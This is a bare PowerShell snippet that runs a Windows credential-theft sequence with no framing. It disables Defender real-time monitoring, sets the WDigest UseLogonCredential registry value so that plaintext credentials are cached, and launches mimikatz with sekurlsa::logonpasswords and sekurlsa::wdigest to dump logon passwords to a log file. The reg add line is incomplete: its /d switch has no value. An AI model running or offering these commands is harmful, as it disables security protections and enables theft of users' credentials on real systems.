Set-MpPreference -DisableRealtimeMonitoring 1

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d

$MIMIARGS='"privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "exit"'
Start-Process -FilePath "C:\Program Files\mimikatz\x64\mimikatz.exe" -ArgumentList $MIMIARGS
